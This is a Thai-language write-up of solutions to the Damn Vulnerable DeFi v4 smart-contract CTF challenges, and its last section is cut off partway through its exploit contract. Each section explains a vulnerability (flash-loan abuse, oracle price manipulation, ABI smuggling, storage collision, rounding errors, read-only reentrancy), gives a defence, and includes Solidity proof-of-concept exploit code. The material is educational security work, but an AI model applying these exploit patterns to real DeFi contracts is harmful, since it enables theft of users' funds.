# Damn Vulnerable DeFi v4 สรุปการแก้บัค
by tinamints

## 1. Unstoppable
### เงื่อนไข :
- หยุดการทำงานของ vault
### คอนเซ็ป :
-  แฟลชโลน
-  DoS
### วิธีแก้ :
- ส่งโทเคนโดยตรง (ไม่ผ่าน `deposit`) เพื่อทำให้ `convertToShares(totalSupply) != balanceBefore` เป็นจริงและเกิด revert เนื่องจาก `totalSupply` อัปเดตได้เฉพาะผ่าน `deposit` เท่านั้น
### การป้องกัน :
- อย่าผูก invariant เข้ากับ `token.balanceOf` โดยตรง ระบบบัญชีแบบ ERC4626 ควรเก็บ shares/assets ภายในเอง เพื่อไม่ให้การ `transfer` ตรง ๆ ทำให้ `flashLoan` พัง — ควรลบเช็ค `convertToShares(totalSupply) != balanceBefore` ออก
### POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

## 2. Naive Receiver
### เงื่อนไข :
- กู้คืนสินทรัพย์ทั้งหมดใน pool
- ทำให้เสร็จภายใน 2 ทรานแซกชัน
### คอนเซ็ป :
-  แฟลชโลน
### วิธีแก้ :
- ระบุ receiver เป็นเป้าหมายให้ค่าธรรมเนียมดูด ETH จนหมด แล้วปลอมตัวเป็น feeReceiver เพื่อถอน WETH ที่สะสมไว้
### การป้องกัน :
- ตรวจสอบตัวตนของผู้เริ่ม flash loan จริง ๆ (อย่าให้ receiver ถูกเก็บค่าธรรมเนียมจาก loan ที่ตัวเองไม่ได้ขอ) และอย่าเชื่อ `_msgSender()` ที่ส่งผ่าน forwarder สำหรับ `withdraw` — ใช้ access control ที่ถูกต้อง/ตรวจสอบ forwarder ที่ไว้ใจได้
### POC
` function test_naiveReceiver() public checkSolvedByPlayer {
    
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), 
                address(weth),
                0, 
                ""
            );
        }
       
        pool.multicall(data);

        
        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
       
    }`

## 3. Truster
### เงื่อนไข :
- กู้คืนสินทรัพย์ทั้งหมดไปยัง recovery
- ทำให้เสร็จใน 1 tx
### คอนเซ็ป :
-  แฟลชโลน
-  ค่าที่ไม่ได้ตรวจสอบ
### วิธีแก้ :
- ตั้ง `target` เป็น pool และส่ง `approve` เป็น `data` เพื่อให้ pool อนุมัติให้ผู้โจมตีใช้โทเคนของ pool เอง
### การป้องกัน :
- อย่าให้ pool เรียก `target.call(data)` แบบ arbitrary ด้วยสิทธิ์ของตัวเอง — ตัดการเรียก calldata ที่ผู้ใช้กำหนดออก หรือทำ whitelist target/selector เพื่อไม่ให้เรียก `approve` บน token ได้
### POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();

    }`

## 4. Side Entrance
### เงื่อนไข :
- กู้คืน ETH ทั้งหมดไปยัง recovery
### คอนเซ็ป :
-  แฟลชโลนแบบมีหลักประกัน
### วิธีแก้ :
- ใช้ประโยชน์จากการที่ `execute` ถูกเรียกระหว่างแฟลชโลน เพื่อฝาก ETH ที่ยืมมากลับเข้า pool เพิ่ม `balance` และได้สิทธิ์เรียก `withdraw` ในภายหลัง
### การป้องกัน :
- ตรวจการคืนเงินกู้จากยอด balance ของ token ที่เพิ่มขึ้นจริง (พร้อม reentrancy guard) ไม่ใช่ปล่อยให้การ `deposit` ระหว่าง loan นับเป็นการคืนเงิน
### POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);

        exploit.exploit();

    }

`

## 5. The Rewarder
### เงื่อนไข :
- กู้คืนสินทรัพย์ให้ได้มากที่สุดไปยัง recovery
- ต้องอยู่ใน beneficiaries เพื่อโต้ตอบกับ distributor
### คอนเซ็ป :
-  การแจกจ่ายแบบจำกัดสิทธิ์
-  ระบบมาร์เคิลทรี
### วิธีแก้ :
- ใช้ประโยชน์จากการที่ `claimRewards()` ไม่ทำเครื่องหมายการเรียกร้องว่าใช้แล้ว จึงสามารถเรียกร้องโทเคนเดิมซ้ำหลายครั้งในการเรียกเดียวเพื่อดึงสินทรัพย์ทั้งหมด
### การป้องกัน :
- ทำเครื่องหมายว่า claim ถูกใช้แล้ว (set claimed bit) ก่อน/ภายในลูป และปฏิเสธ claim ของ (token,batch) ที่ซ้ำ เพื่อไม่ให้เคลม reward เดิมซ้ำได้ในครั้งเดียว
### POC
` function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

    }`

## 6. Selfie
### เงื่อนไข :
- ดึงโทเคนทั้งหมดออกจาก pool ไปยัง recovery
### คอนเซ็ป :
-  แฟลชโลน
-  การปลอมแปลงอำนาจโหวต governance
### วิธีแก้ :
- ยืมโทเคนของ pool ผ่านแฟลชโลนเพื่อได้อำนาจโหวตส่วนใหญ่ชั่วคราว คิว `emergencyExit` เป็น governance action คืนโลน รอ 2 วัน แล้วรัน action
### การป้องกัน :
- คำนวณ voting power จาก balance แบบ checkpoint/ถ่วงน้ำหนักด้วยเวลา ที่ถือก่อนสร้าง proposal เพื่อไม่ให้ balance ที่ flashloan มาในบล็อกเดียวถึง quorum ได้
### POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

## 7. Compromised
### เงื่อนไข :
- ดึง ETH ทั้งหมดออกจาก exchange ไปยัง recovery
- ผู้เล่นต้องไม่มี NFT
- ราคา NFT ต้องไม่เปลี่ยนแปลง
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle
-  การรั่วไหลของ private key
### วิธีแก้ :
- ถอดรหัส private key จากข้อความ hex ใน README ของ oracle 2 แหล่ง ตั้งราคา NFT เป็น 0 ซื้อด้วย 1 wei คืนราคาเป็น 999 ETH ขาย NFT แล้วส่ง ETH ไปยัง recovery
### การป้องกัน :
- เก็บ private key ของ oracle ให้ปลอดภัย และรวมราคาจากหลายแหล่งที่เป็นอิสระพร้อมเช็คความเบี่ยงเบน (เช่น Chainlink) เพื่อไม่ให้การรั่ว/ควบคุมไม่กี่แหล่งกำหนดราคาได้
### POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

## 8. Puppet
### เงื่อนไข :
- ดึง DVT 100k ทั้งหมดออกจาก lending pool ไปยัง recovery
- ทำให้เสร็จใน 1 ทรานแซกชัน
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle ของ Uniswap V1
-  EIP-2612 permit
### วิธีแก้ :
- ทุ่ม DVT 1000 ของผู้เล่นเข้า Uniswap V1 เพื่อทำให้ราคาโทเคนดิ่ง ทำให้ `calculateDepositRequired` ต้องการหลักประกันแทบเป็นศูนย์ แล้วยืมโทเคนทั้งหมดใน 1 tx โดยใช้ permit
### การป้องกัน :
- อ่านราคาจาก oracle ที่ทนต่อการปั่น (TWAP / Chainlink) ไม่ใช่ราคา spot จาก reserves ของ Uniswap V1 ทันที
### POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

## 9. Puppet V2
### เงื่อนไข :
- ดึง DVT 1M ทั้งหมดออกจาก lending pool ไปยัง recovery
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle ของ Uniswap V2
-  หลักประกัน WETH
### วิธีแก้ :
- ขาย DVT 10k ของผู้เล่นทั้งหมดเข้า Uniswap V2 เพื่อทำให้ราคา DVT ดิ่ง แล้วยืมโทเคน 1M ด้วยหลักประกัน WETH ที่น้อยมาก
### การป้องกัน :
- เหมือน Puppet: ใช้ TWAP/oracle ภายนอกแทนราคา spot จาก `getReserves` ของ Uniswap V2 ในการตีมูลค่าหลักประกัน
### POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

## 10. Free Rider
### เงื่อนไข :
- ดึง NFT ทั้ง 6 ชิ้นออกจาก marketplace
- ผู้เล่นได้รับ bounty (45 ETH)
### คอนเซ็ป :
-  แฟลชโลน Uniswap V2
-  บั๊กในลอจิกการซื้อของ NFT marketplace
### วิธีแก้ :
- ยืม 15 ETH (ราคา NFT 1 ชิ้น) จากแฟลชโลน บั๊กใน marketplace คือตรวจ `msg.value >= price` แค่ครั้งเดียวแต่ซื้อได้ทั้ง 6 ชิ้น และส่ง ETH คืนให้ผู้ซื้อแทนผู้ขาย ซื้อทั้ง 6 ชิ้นด้วย 15 ETH ส่งไปยัง recoveryManager เพื่อรับ bounty 45 ETH
### การป้องกัน :
- คิดเงินเป็นผลรวมราคาของ NFT ทุกชิ้น (ตรวจการจ่ายเงินต่อชิ้น) และส่งเงินให้ผู้ขาย (เจ้าของก่อนโอน) ตามหลัก checks-effects-interactions
### POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

## 11. Backdoor
### เงื่อนไข :
- ดึง DVT 40 ทั้งหมดไปยัง recovery
- ทำให้เสร็จใน 1 ทรานแซกชัน
### คอนเซ็ป :
-  Safe proxy factory
-  การแทรกคำสั่งในช่วง setup
### วิธีแก้ :
- ใช้ฟิลด์ `initializer` ของ `createProxyWithCallback` เพื่อแทรก `approve` ระหว่าง `setup()` ของ Safe เมื่อ WalletRegistry ส่ง DVT 10 ให้ wallet ใหม่ ผู้โจมตีก็ `transferFrom` ทันที ทำซ้ำสำหรับผู้ใช้ทั้ง 4 คน
### การป้องกัน :
- ให้ registry ตรวจสอบการ setup ของ wallet ใหม่ (owner ที่คาดไว้, ไม่มี module/delegatecall/การเรียกที่ถูกฝัง) ก่อนจ่ายเงิน แทนที่จะเชื่อ calldata `initializer` ที่กำหนดเองได้
### POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

## 12. Climber
### เงื่อนไข :
- ดึง DVT 10M ทั้งหมดออกจาก vault ไปยัง recovery
### คอนเซ็ป :
-  บั๊กของ timelock ที่รันก่อนตรวจสอบ schedule
-  การอัพเกรด UUPS proxy
### วิธีแก้ :
- `execute()` รันแอคชันก่อนตรวจสอบว่า schedule ไว้หรือยัง รัน batch: ①ตั้ง delay เป็น 0 ②มอบ proposer role ให้ attacker ③อัพเกรด vault เป็น implementation อันตราย ④เรียก `schedule` ย้อนหลังจากภายใน callback จากนั้นเรียก `sweepFunds` บน vault ที่อัพเกรดแล้ว
### การป้องกัน :
- ตรวจว่า operation ถูก schedule และพร้อมแล้ว ก่อน execute (และทำเครื่องหมายว่า executed ก่อนเรียก external) — บังคับลำดับ schedule ก่อน execute
### POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`

## 13. Wallet Mining
### เงื่อนไข :
- กู้คืน DVT 20M ทั้งหมดจากที่อยู่ฝากเงินของผู้ใช้กลับไปยังผู้ใช้ และจ่ายรางวัลของ wallet deployer ให้กับ ward
### คอนเซ็ป :
-  ช่องโหว่ storage slot ชนกันใน upgradeable proxy (การ init ซ้ำ)
-  การขุดที่อยู่ด้วย CREATE2
### วิธีแก้ :
- ตัวแปร `needsInit` ของ `AuthorizerUpgradeable` อยู่ที่ storage slot 0 ซึ่งชนกับที่อยู่ `upgrader` ของ proxy (ซึ่งไม่เป็นศูนย์เสมอ) ทำให้ใครก็ตามเรียก `init()` ซ้ำเพื่อให้สิทธิ์ตัวเองได้ ส่วน `WalletDeployer.drop()` ตรวจสอบแค่ว่าคู่ `(wat, nonce)` ที่เลือกจะ deploy ด้วย CREATE2 ไปตรงกับ `USER_DEPOSIT_ADDRESS` หรือไม่ จึง brute-force หาค่า nonce จนกว่าจะตรงกัน แล้ว deploy Safe จริงที่ตำแหน่งนั้น (โดยมี `user` เป็นเจ้าของ) จากนั้นดึงเงินออกด้วยลายเซ็นของผู้ใช้ผ่าน `execTransaction` และส่งรางวัลของ deployer ให้กับ `ward`
### การป้องกัน :
- เก็บ flag init ไว้ใน slot เฉพาะที่ไม่ชนกัน (ใช้ `Initializable` ของ OZ) เพื่อไม่ให้ replay `init()` ได้ และอย่าโอนเงินไปยัง address ที่คาดการณ์ไว้ก่อนตรวจสอบเจ้าของ wallet ที่ deploy จริง
### POC
`{
     // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
            , initCodeHash)))));        
                
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
`

## 14. Puppet V3
### เงื่อนไข :
- ดึง 1 ล้าน DVT จาก lending pool ไปยัง recovery
- ทำให้เสร็จภายในเวลาที่กำหนด (น้อยกว่า 115 วินาทีหลังวิ่ง setup)
### คอนเซ็ป :
-  TWAP oracle ของ Uniswap V3
-  ราคาเฉลี่ยถ่วงน้ำหนักตามเวลา (ใช้ `vm.warp` เพื่อบิดเบือนราคาให้มากขึ้น)
### วิธีแก้ :
- เทเหรียญ DVT 110 ของผู้เล่นเข้า pool Uniswap V3 ผ่าน `exactInputSingle` เพื่อกดราคาโทเคนให้ร่วง จากนั้น `vm.warp` เวลาไปข้างหน้าให้ใกล้ขีดจำกัดเวลาที่สุด เพื่อให้ TWAP บิดเบือนราคา ทำให้ `calculateDepositOfWETHRequired` ถูกลงมากพอที่จะกู้ DVT 1 ล้านโดยใช้ WETH ค้ำประกันเพียงเล็กน้อย
### การป้องกัน :
- ใช้หน้าต่าง TWAP ที่ยาวขึ้น (และ/หรือ oracle ตัวที่สอง) เพื่อไม่ให้การดันราคาสั้น ๆ ในบล็อกเดียวขยับค่าเฉลี่ยได้มากพอจะโกง quote หลักประกัน
### POC
` function test_puppetV3() public checkSolvedByPlayer {
        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(address(uniswapRouterAddress), type(uint256).max);
        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("quote1: ", quote1);
 
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE,
                0,
                0
            )
        );  
         vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("quote: ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
    }
`

## 15. ABI Smuggling
### เงื่อนไข :
- ดึงเหรียญ DVT ทั้ง 1 ล้านจาก vault ไปยัง recovery
### คอนเซ็ป :
-  ABI smuggling
-  การปลอมตำแหน่ง offset ใน calldata
### วิธีแก้ :
- `execute()` เช็คสิทธิ์โดยอ่าน selector จากตำแหน่ง calldata ที่ hardcode ไว้ (byte ที่ 100) ไม่ได้อ่านจากตำแหน่งจริงของ `actionData` เราจึงสร้าง calldata ที่วาง selector ของ `withdraw` (ซึ่งผู้เล่นมีสิทธิ์เรียก) ไว้ที่ byte 100 เป็นตัวหลอก ในขณะที่ตัว offset จริงชี้ไปยังข้อมูลที่ซ่อนอยู่ไกลออกไป ซึ่งเป็น payload ของ `sweepFunds` (ที่ผู้เล่นไม่มีสิทธิ์เรียก) ทำให้ระบบตรวจสอบสิทธิ์ผ่านจากตัวหลอก แต่ vault กลับไปรัน action ที่ถูกซ่อนไว้จริง
### การป้องกัน :
- ถอดรหัส `actionData` ให้ตรงกับที่จะถูก execute จริง แล้วเช็ค selector ของ payload จริงนั้น — อย่าอ่าน selector สำหรับเช็คสิทธิ์จากตำแหน่ง calldata ที่ hardcode ไว้
### POC
` function test_abiSmuggling() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }`

`contract Exploit {
    function executeExploit() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        return calldataPayload;
    }
}`

## 16. Shards
### เงื่อนไข :
- ดึง DVT ออกจาก marketplace แล้วส่งทั้งหมดไปยัง recovery
- ยอดเงินใน staking contract ต้องไม่เปลี่ยน
- ผู้เล่นส่งได้แค่ 1 transaction
### คอนเซ็ป :
-  rounding error (ปัดลง vs ปัดขึ้น)
-  สูตรจ่ายเงินกับสูตรคืนเงินไม่ตรงกัน
-  การเช็คเวลาที่เขียนผิด
### วิธีแก้ :
- `fill()` คิดเงินด้วยสูตร `want * _toDVT(price, rate) / totalShards` แบบปัดทศนิยมลง ทำให้ซื้อ 100 shards แล้วจ่าย 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0) แต่ `cancel()` คืนเงินด้วยอีกสูตรคือ `shards * rate / 1e6` แบบปัดขึ้น ทำให้ได้ DVT คืนมาประมาณ 7.5e12 wei ต่อ 100 shards และการเช็คเวลาใน `cancel()` เขียนกลับด้าน เลยยกเลิกได้ทันทีใน block เดียวกับที่ซื้อ จึงวน fill → cancel 10001 รอบใน exploit contract (เพื่อให้จบใน 1 transaction) แล้วส่งกำไรไปที่ recovery
### การป้องกัน :
- ใช้การปัดเศษที่สอดคล้องกันและเข้าข้างโปรโตคอลเสมอ (ปัดเงินที่เก็บขึ้น, ปัดเงินคืนลง), ปฏิเสธการ fill ที่ราคาเป็น 0, และแก้เงื่อนไขเช็คเวลาที่กลับด้านใน `cancel()`
### POC
` function test_shards() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
    }`

`contract Exploit {
    function attack(uint64 offerId) external {
        uint256 wantShards = 100;
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }
        token.transfer(recovery,token.balanceOf(address(this)));
    }
}`



## 17. Curvy Puppet
### เงื่อนไข :
- ปิด position ของผู้ใช้ทั้ง 3 คน (alice/bob/charlie) ในสัญญา lending ให้หมด (ทั้ง collateral และ borrow ต้องเป็น 0)
- treasury ต้องยังเหลือ WETH และ LP อยู่บ้าง และต้องได้ DVT ของผู้ใช้ทั้ง 3 คนครบ (7500)
- player ต้องไม่เหลืออะไรเลย
### คอนเซ็ป :
-  read-only reentrancy (Curve `get_virtual_price()`)
-  การปั่นราคา oracle ของ borrow asset
-  flash loan ซ้อนกัน (Balancer + Aave)
### วิธีแก้ :
- สัญญา lending ตีราคา borrow asset (LP token ของ Curve stETH/ETH) ด้วยสูตร `ETH_price * get_virtual_price()` ซึ่ง `remove_liquidity` ของ Curve pool รุ่นเก่าจะ burn LP supply ก่อน แล้วค่อย raw-call ส่ง ETH กลับมาให้ผู้เรียก **ก่อน** ที่ balance ของ pool จะถูกอัปเดตเสร็จ ทำให้ `get_virtual_price()` อ่านค่าที่ถูกปั่นให้สูงเกินจริงในช่วง callback ที่รับ ETH นั้น (read-only reentrancy) และเพราะ LP token เป็น *borrow asset* ของผู้ใช้ ราคา LP ที่พองขึ้นจึงทำให้มูลค่าหนี้ของทุกคนพองตาม ดัน position ที่เดิมมีหลักประกันเกินพอ 3 อันให้กลายเป็น liquidate ได้
- เงื่อนไข liquidate จะเข้าเมื่อ `collateralValue*100 < borrowValue*175` โดย collateral = 2500 DVT ที่ $10 และ borrow = 1 LP จึงต้องดันให้ `virtual_price > 3.5714e18` (ค่าปกติอยู่ที่ ~1.1e18)
- ขั้นตอน: กู้ flash loan WETH+wstETH จาก Balancer (วงนอก ไม่มีค่าธรรมเนียม) และ Aave (วงใน) → unwrap/withdraw เป็น ETH+stETH → `add_liquidity` ก้อนใหญ่มากที่จงใจให้ stETH เยอะ (ค่า spike แปรตามฝั่ง stETH) → `remove_liquidity` → ในฟังก์ชัน `receive()` ที่รับ ETH ตอนนั้น virtual_price ถูกปั่นขึ้นแล้ว จึง `liquidate()` ผู้ใช้ทั้ง 3 คน (จ่าย 1 LP ต่อคนจาก 6.5 LP ของ treasury และได้ 2500 DVT ต่อคน)
- การใช้หนี้: เพราะฝากแบบ ETH น้อย เงินที่ได้คืนจึงเป็น ETH เยอะ / stETH น้อย เหลือ ETH เกินและขาด wstETH ที่มูลค่าใกล้เคียงกัน จึงกัน WETH ที่ต้องจ่ายไว้ก่อน แล้วแปลง ETH ที่เหลือเป็น stETH ผ่าน Lido (เก็บ reserve ไว้นิดหน่อยให้ treasury ยังมี WETH) แล้ว wrap เพื่อให้ครบ wstETH ที่ต้องจ่าย ต้นทุนหลักคือค่าธรรมเนียม Aave ~0.05% ซึ่งกินจากเงินสำรอง 200 WETH ของ treasury จึงต้องกู้ wstETH ไม่ให้เยอะเกินไป
### การป้องกัน :
- อย่าอ่าน `get_virtual_price()` (หรือ state ใด ๆ ของ pool) ในจังหวะที่ยังส่ง control ให้ผู้เรียกที่ไม่น่าเชื่อถือได้ — ใช้ oracle ที่ทนต่อการปั่นราคา หรือใส่ reentrancy lock ให้กับ view (ภายหลัง Curve ได้เพิ่มการป้องกัน reentrancy ให้ `remove_liquidity`) และอย่าตีราคาสินทรัพย์กู้ยืมจาก virtual price ณ จุดเดียว
### POC
` function test_curvyPuppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(
            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
        );
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        exploit.run();
    }`

`contract Exploit {
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // stETH เยอะ: ปรับให้ virtual_price เกิน ~3.5714e18 (threshold ของการ liquidate)
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    uint256 constant ETH_RESERVE = 20e18; // ETH ที่กันไว้ให้ treasury ยังมี WETH > 0

    // ... immutables + constructor เก็บ lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users
    enum State { NONE, LIQUIDATING }
    State state;

    function run() external {
        // OUTER loan: Balancer (เรียง token น้อยไปมาก: wstETH < WETH)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH); tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // คืนทุกอย่างให้ treasury
        weth.deposit{value: address(this).balance}();
